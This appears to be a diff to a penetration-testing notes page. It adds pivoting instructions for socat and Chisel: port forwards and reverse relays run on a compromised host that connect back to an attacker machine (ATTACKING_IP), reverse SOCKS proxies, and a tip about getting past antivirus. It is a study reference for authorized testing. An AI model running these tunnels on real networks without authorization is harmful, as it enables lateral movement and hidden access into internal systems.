@@ -42,17 +42,60 @@ ssh -R 9090 tunneluser@ATTACKING_IP -fN
 {% endtabs %}
 
 ### SOCAT
+We can use static binaries of socat to pivot, they are easy to find for both Linux and Windows. 
+{% hint style="danger" %}
+Windows version is unlikely to bypass Antivirus software by default, so custom compilation may be required.
+{% endhint %} 
+
 {% tabs %}
-{% tab title="Socat" %}
-WORK_IN_PROGRESS
+{% tab title="Forward" %}
+The quick and easy way to set up a port forward with socat is quite simply to open up a listening port on the compromised server, and redirect whatever comes into it to the target server. 
+```bash
+PC> ./socat tcp-l:33060,fork,reuseaddr tcp:172.16.0.10:3306 &
+```
+{% endtab %}
+
+{% tab title="Reverse" %}
+First of all, on our own attacking machine, we issue the following command:
+```bash
+v4resk@kali$ ./socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &
+```
+Next, on the compromised relay server (172.16.0.5 in the previous example) we execute this command:
+```bash
+PC> ./socat tcp:ATTACKING_IP:8001 tcp:TARGET_IP:TARGET_PORT,fork &
+```
+Now throught `localhost:8000` we can access `172.16.0.10:80`
+```bash
+#Example
+PC> ./socat tcp:10.50.73.2:8001 tcp:172.16.0.10:80,fork &
+```
 {% endtab %}
 {% endtabs %}
 
 
 ### CHISEL
+[Chisel](https://github.com/jpillora/chisel) is an awesome tool which can be used to quickly and easily set up a tunnelled proxy or port forward through a compromised system, regardless of whether you have SSH access or not. It's written in Golang and can be easily compiled for any system (with static release binaries for Linux and Windows provided).  
+
 {% tabs %}
-{% tab title="Chisel" %}
-WORK_IN_PROGRESS
+{% tab title="Reverse Proxy" %}
+We can do a Reverse Proxy with Chisel. This connects back from a compromised server to a listener waiting on our attacking machine: 
+```bash
+v4resk@kali$ ./chisel server -p LISTEN_PORT --reverse &
+```
+On the compromised host, we would use the following command:
+```bash
+www-data@pwned.lab$ ./chisel client ATTACKING_IP:LISTEN_PORT R:socks &
+```
+{% endtab %}
+{% tab title="Forward Proxy" %}
+We can do a Forward Proxy with Chisel
+```bash
+v4resk@kali$ ./chisel client TARGET_IP:LISTEN_PORT LOCAL_PROXY_PORT:socks
+```
+On the compromised host, we would use the following command:
+```bash
+www-data@pwned.lab$ ./chisel server -p LISTEN_PORT --socks5
+```
 {% endtab %}
 {% endtabs %}
 
